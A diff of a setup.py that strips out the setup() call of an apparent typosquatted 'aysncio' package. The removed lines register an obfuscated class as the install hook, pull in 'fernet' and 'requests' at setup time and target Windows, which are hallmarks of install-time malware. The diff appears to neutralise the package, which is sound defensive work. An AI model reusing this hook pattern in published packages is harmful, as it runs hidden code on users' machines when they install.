@@ -18,22 +18,5 @@ class IulSsOWUhoFUxrchPLykDTcQVLLiRPlhapXZudVvRjzBVNtOqYudCSOqgnRbkMRtyJXoxSleVE
             install.run(self)
 
 
-setup(
-    name="aysncio",
-    version=VERSION,
-    author="PXXsySYfcaf",
-    author_email="WIpiY@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': IulSsOWUhoFUxrchPLykDTcQVLLiRPlhapXZudVvRjzBVNtOqYudCSOqgnRbkMRtyJXoxSleVEnTingonGUeMgiKgfhFSyBAc,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
